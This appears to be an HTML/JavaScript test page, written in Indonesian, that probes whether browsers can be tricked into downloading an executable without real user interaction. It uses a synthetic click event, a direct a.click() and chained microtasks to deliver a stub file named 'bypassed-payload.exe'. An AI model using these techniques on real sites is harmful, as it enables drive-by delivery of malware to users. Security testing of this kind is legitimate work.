<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>User Gesture Bypass Test</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: Arial, sans-serif; background: #f4f6f8; color: #222; padding: 20px; }
.panel { background: #ffffff; padding: 24px; border-radius: 12px; box-shadow: 0 2px 12px rgba(0, 0, 0, 0.1); max-width: 600px; margin: 40px auto; }
h2 { margin-bottom: 10px; }
p { margin-bottom: 15px; line-height: 1.5; }
button { width: 100%; padding: 16px; cursor: pointer; border: none; border-radius: 6px; background: #d32f2f; color: #ffffff; font-weight: bold; font-size: 16px; box-shadow: 0 4px 12px rgba(211, 47, 47, 0.3); transition: background 0.2s; }
button:hover { background: #b71c1c; }
#status { margin-top: 16px; font-weight: bold; color: #d32f2f; padding: 12px; background: #ffebee; border-radius: 6px; text-align: center; border: 1px solid #ffcdd2; }
</style>
</head>

<body>
<div class="panel" id="main-panel">
    <h2>User Gesture Bypass Vulnerability</h2>
    <p>Menguji apakah browser bisa ditipu untuk mengizinkan unduhan otomatis tanpa interaksi fisik, menggunakan pemalsuan event dan rantai microtask.</p>
    
    <button id="start-btn" type="button">Mulai Uji Bypass</button>
    <div id="status" role="status">Sistem siap.</div>
</div>

<script>
    const startBtn = document.getElementById("start-btn");
    const statusDiv = document.getElementById("status");

    const speak = (message) => {
        if ('speechSynthesis' in window) {
            window.speechSynthesis.cancel();
            const utterance = new SpeechSynthesisUtterance(message);
            utterance.lang = 'id-ID';
            window.speechSynthesis.speak(utterance);
        }
    };

    startBtn.addEventListener("click", () => {
        startBtn.disabled = true;
        statusDiv.textContent = "Memicu Bypass...";
        speak("Memulai uji bypass.");

        // Simulasi payload EXE (MZ Header)
        const b64Data = "TVqQAAMAAAAEAAAAAEEAAgBA";
        const binary = atob(b64Data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);

        // Fungsi untuk memicu unduhan
        const triggerDownload = () => {
            try {
                const blob = new Blob([bytes], { type: 'application/octet-stream' });
                const url = URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'bypassed-payload.exe';
                a.style.display = 'none';
                document.body.appendChild(a);
                
                // TRIK 1: Palsukan event klik fisik (MouseEvent)
                const clickEvent = new MouseEvent('click', {
                    view: window,
                    bubbles: true,
                    cancelable: true
                });
                a.dispatchEvent(clickEvent); 
                
                // TRIK 2: Panggil a.click() secara langsung
                a.click();

                statusDiv.textContent = "Unduhan dipicu via Event Palsu!";
                statusDiv.style.color = "#4CAF50";

                setTimeout(() => {
                    document.body.removeChild(a);
                    URL.revokeObjectURL(url);
                }, 3000);
            } catch (e) {
                statusDiv.textContent = "Gagal: " + e.message;
                statusDiv.style.color = "#f00";
            }
        };

        // TRIK 3: Rantai Asinkron (Microtask) yang cepat
        // Terkadang browser menganggap microtask yang berjalan cepat masih bagian dari "gesture"
        queueMicrotask(() => {
            queueMicrotask(() => {
                triggerDownload();
            });
        });
    });
</script>
</body>
</html>
